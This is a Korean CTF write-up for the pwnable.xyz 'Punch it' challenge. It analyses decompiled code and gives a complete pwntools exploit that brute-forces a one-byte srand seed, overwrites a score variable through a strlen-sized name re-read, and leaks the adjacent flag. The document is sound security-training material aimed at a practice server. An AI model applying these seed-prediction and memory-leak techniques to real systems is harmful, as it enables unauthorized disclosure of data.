# [pwnable.xyz] Punch it

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Who is the strongest puncher?
>
> Release: [Punch it.zip](https://github.com/h0meb0dy/pwnable.xyz/files/9000518/Punch.it.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/176167110-ee569c1e-c3ea-4b37-8fcb-4f578165b12a.png)

## Analysis

### `motd_select_character()`

```c
  printf("\n\tLet's play a punching game? [Y/n] : ");
  if ( getchar() == 'n' )
    exit(1);
  getchar();
  printf("Name: ");
  read(0, name, 0x2CuLL);
```

Punching game을 할 건지 물어보는데, `'n'`이라고 대답하면 `exit()`으로 프로그램을 종료한다.

전역 변수 `name`에 `0x2c`바이트만큼 이름을 입력받는다.

```c
  printf("Select your character: \n\t1. Goku\n\t2. Saitama\n\t3. Naruto\n\t4. Toriko\n> ");
  character = getchar();
```

4가지 캐릭터 중 하나를 선택할 수 있다.

#### 1. Goku

```c
    if ( character != '1' )
    {
LABEL_14:
      puts("Invalid");
      goto LABEL_15;
    }
    choose_goku();
```

#### `choose_goku()`

```c
int choose_goku()
{
  int fd; // [rsp+Ch] [rbp-4h]

  fd = open("/dev/urandom", 0);
  if ( fd == -1 )
  {
    puts("error");
    exit(1);
  }
  read(fd, &game_t, 4uLL);
  return close(fd);
}
```

전역 변수 `game_t`에 `/dev/urandom`으로부터 랜덤한 4바이트 값을 읽어온다.

#### 2. Saitama

```c
  if ( character == '2' )
  {
    choose_saitama();
  }
```

#### `choose_saitama()`

```c
int choose_saitama()
{
  int fd; // [rsp+Ch] [rbp-4h]

  fd = open("/dev/urandom", 0);
  if ( fd == -1 )
  {
    puts("error");
    exit(1);
  }
  read(fd, &game_t, 1uLL);
  return close(fd);
}
```

전역 변수 `game_t`에 `/dev/urandom`으로부터 랜덤한 1바이트 값을 읽어온다.

#### 3. Naruto

```c
    if ( character == '3' )
    {
      choose_naruto();
    }
```

#### `choose_naruto()`

```c
int choose_naruto()
{
  int fd; // [rsp+Ch] [rbp-4h]

  fd = open("/dev/urandom", 0);
  if ( fd == -1 )
  {
    puts("error");
    exit(1);
  }
  read(fd, &game_t, 2uLL);
  return close(fd);
}
```

전역 변수 `game_t`에 `/dev/urandom`으로부터 랜덤한 2바이트 값을 읽어온다.

#### 4. Toriko

```c
      if ( character != '4' )
        goto LABEL_14;
      choose_toriko();
```

#### `choose_toriko()`

```c
int choose_toriko()
{
  int fd; // [rsp+Ch] [rbp-4h]

  fd = open("/dev/urandom", 0);
  if ( fd == -1 )
  {
    puts("error");
    exit(1);
  }
  read(fd, &game_t, 3uLL);
  return close(fd);
}
```

전역 변수 `game_t`에 `/dev/urandom`으로부터 랜덤한 3바이트 값을 읽어온다.

결과적으로, 캐릭터를 선택함으로써 `game_t`에 몇 바이트짜리 랜덤 값을 생성할지 선택할 수 있다.

```c
  srand(game_t);
  printf("Loading");
  for ( i = 0; i <= 4; ++i )
  {
    putchar('.');
    sleep(1u);
  }
  putchar('\n');
```

`game_t`에 생성된 랜덤 값은 `srand()`의 인자로 전달되어 랜덤 시드를 설정하는 데 사용된다.

```c
  fd = open("./flag", 0);
  if ( fd == -1 )
  {
    puts("error");
    exit(1);
  }
  read(fd, &flag, 0x80uLL);
  return close(fd);
```

플래그 파일의 내용을 읽어와서 전역 변수 `flag`에 저장한다.

### `main()`

```c
        printf("score: %ld\n", score);
        printf("gimmi pawa> ");
        guess = 0;
        random = rand();
        _isoc99_scanf("%u", &guess);
        getchar();
```

`rand()`로 랜덤 값을 생성하고 `guess`를 입력받는다.

```c
        if ( guess != random )
          break;
        puts("draw");
        printf("Save? [N/y]");
        if ( getchar() == 'y' )
        {
          printf("Name: ");
          nameLen = strlen(name);
          read(0, name, nameLen);
        }
```

`guess`와 `random`이 같으면 `name`에 `strlen(name)`만큼 다시 입력을 받는다.

```c
      if ( guess <= random )
        break;
      ++score;
```

`guess`가 `random`보다 크면 전역 변수 `score`의 값을 1 증가시킨다.

```c
  }
  while ( guess >= random );
  printf("Sowwy, pleya %s luse, bay bay", name);
```

`guess`가 `random`보다 작으면 `name`에 저장된 문자열을 `"%s"`로 출력하고 함수를 종료한다.

## Exploit

`random`의 값을 예측할 수 있다면 아래의 순서로 플래그를 알아낼 수 있다.

1. `random`보다 큰 `guess`를 입력하여 `score`를 `0x01`로 만든다.
2. `random`과 같은 `guess`를 입력하여 `name`을 다시 입력하는데, 이때 `score`의 마지막 1바이트를 `0xff`로 덮어쓴다.
3. `random`보다 큰 `guess`를 두 번 입력하여 `score`를 `0x0101`로 만든다.
4. `random`과 같은 `guess`를 입력하여 `name`을 다시 입력하는데, 이때 `score`의 마지막 2바이트를 `0xffff`로 덮어쓴다.
5. ...

이 과정을 반복하면 `score`의 8바이트를 모두 `0x00`이 아닌 값으로 채울 수 있다.

![image](https://user-images.githubusercontent.com/104156058/176170789-0ae7a3de-8c48-4e20-8047-0723ee25f11c.png)

그리고 나서 `random`보다 작은 `guess`를 입력해서 `name`을 출력하면, (`name`이 `0x2c`바이트만큼 가득 채워져 있다는 전제 하에) `score`에 빈 공간이 없기 때문에 `flag`까지 모두 출력되어 나온다.

### Brute force random seed

`motd_select_character()`에서 `2. Saitama`를 선택하면 `game_t`에 1바이트 랜덤 값이 생성되고 그 값이 `srand()`의 인자로 들어가게 된다. 가능한 경우의 수는 `0x100`가지이므로, 브루트포싱으로 이 랜덤 값을 알아낼 수 있다.

임의의 1바이트 값(`game_t`)을 인자로 전달하여 `srand()`를 실행해서 시드를 설정한 다음, 첫 번째 `rand()`의 반환값을 입력한다. `"draw"`가 출력되면 `game_t`를 맞춘 것이다.

```python
# brute force random seed

while 1:
    if LOCAL:
        r = process('./release/challenge')
    else:
        r = remote('svc.pwnable.xyz', 30024)

    sla = r.sendlineafter
    sa = r.sendafter

    sla('Let\'s play a punching game? [Y/n] : ', 'Y')
    sa('Name: ', 'A' * 0x2c)
    sla('> ', '2')  # select saitama

    libc = ctypes.CDLL('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
    libc.srand(0x7f) # guess game_t

    sla('gimmi pawa> ', str(libc.rand()))

    if b'draw' in r.recvn(4):
        break
    else:
        r.close()

sla('Save? [N/y]', 'N')
```

중간에 로딩 때문에 상당히 오래 걸린다.

### Print flag

```python
# print flag

def Score():
    sla('gimmi pawa> ', str(libc.rand() + 1))

def Name(name):
    sla('gimmi pawa> ', str(libc.rand()))
    sa('Save? [N/y]', 'y')
    sa('Name: ', name)

# ex) Fill(4): 0x00010101 -> 0x01010101
def Fill(byte):
    Name('A' * 0x2c + '\xff' * (byte - 1))
    Score()
    Score()
    if byte > 2:
        for sub_byte in range(2, byte):
            Fill(sub_byte)

Score()
for byte in range(2, 9):
    Fill(byte)

sla('gimmi pawa> ', str(libc.rand() - 1)) # print name + score + flag
```

`rand()`의 반환값보다 1만큼 큰 값을 넣으면 점수가 1 오르고, 같은 값을 넣으면 `name`을 입력할 수 있다. 위에서 설명한 과정을 `Fill()`이라는 함수로 구현하여, 재귀적으로 `Score()`과 `Name()`을 이용하여 `score`를 `0x0101010101010101`로 만들도록 하였다.

### Full exploit

```python
from pwn import *
import ctypes

LOCAL = False


# brute force random seed

while 1:
    if LOCAL:
        r = process('./release/challenge')
    else:
        r = remote('svc.pwnable.xyz', 30024)

    sla = r.sendlineafter
    sa = r.sendafter

    sla('Let\'s play a punching game? [Y/n] : ', 'Y')
    sa('Name: ', 'A' * 0x2c)
    sla('> ', '2')  # select saitama

    libc = ctypes.CDLL('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
    libc.srand(0x7f) # guess game_t

    sla('gimmi pawa> ', str(libc.rand()))

    if b'draw' in r.recvn(4):
        break
    else:
        r.close()

sla('Save? [N/y]', 'N')


# print flag

def Score():
    sla('gimmi pawa> ', str(libc.rand() + 1))

def Name(name):
    sla('gimmi pawa> ', str(libc.rand()))
    sa('Save? [N/y]', 'y')
    sa('Name: ', name)

# ex) Fill(4): 0x00010101 -> 0x01010101
def Fill(byte):
    Name('A' * 0x2c + '\xff' * (byte - 1))
    Score()
    Score()
    if byte > 2:
        for sub_byte in range(2, byte):
            Fill(sub_byte)

Score()
for byte in range(2, 9):
    Fill(byte)

sla('gimmi pawa> ', str(libc.rand() - 1)) # print name + score + flag


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30024: Done
[*] Closed connection to svc.pwnable.xyz port 30024
[+] Opening connection to svc.pwnable.xyz on port 30024: Done
[*] Closed connection to svc.pwnable.xyz port 30024
...
[+] Opening connection to svc.pwnable.xyz on port 30024: Done
[*] Switching to interactive mode
Sowwy, pleya AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLAG{aka_caped_baldy} luse
```